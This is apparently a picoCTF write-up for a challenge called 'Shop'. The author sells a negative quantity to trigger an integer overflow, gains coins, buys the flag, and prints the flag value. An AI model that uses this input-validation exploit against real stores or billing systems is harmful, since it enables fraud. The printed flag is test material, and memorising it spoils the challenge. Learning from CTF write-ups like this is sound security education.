# Shop

## Challenge Description

Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source. The shop is open for business at nc mercury.picoctf.net 42159 

## Hints

Always check edge cases when programming 

## Solution

I began by running the provided file and it was a menu driven program with options to buy and sell items
```bash
Welcome to the market!
=====================
You have 40 coins
        Item            Price   Count
(0) Quiet Quiches       10      12
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option:
```

Firstly I tried buying the flag
```bash
Choose an option: 2
How many do you want to buy? 1
Not enough money.
```
Fair enough because I only have 40 coins and the flag requires. So somehow I'll have to trick the program into giving my more money to buy the flag

I experimented with all the other options and after a series of trial and error I realised that I can give negative quantities while selling an item
```bash
What do you want to sell?
0
How many?
-30
You have -270 coins
```

The program isn’t checking whether the number you sell is negative. So I figured  the coins calculation must be something like `coins += price × quantity`. And when quantity is negative, we’re subtracting instead of adding. 

Now this is where integer overflow comes into play which wraps the value around to a positive number if the result exceeds the lower bound. So if I give a negative number large enough cause an integer overflow, the value will wrap itself into a large positive number, which is just what I need

```bash
Your inventory
(0) Quiet Quiches       10      0
(1) Average Apple       15      0
(2) Fruitful Flag       100     0
What do you want to sell?
2
How many?
-2147483645
You have 340 coins
        Item            Price   Count
(0) Quiet Quiches       10      12
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option:
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 55 57 55 98 50 57 50 99 125]
```
Now all I need to do is convert the ASCII to text, for which I used an [online converter](https://www.duplichecker.com/ascii-to-text.php)
![image](https://github.com/user-attachments/assets/29ce53a0-08e8-4f01-a5cc-677a9998734a)

Thus the flag for this challenge is `picoCTF{b4d_brogrammer_797b292c}`
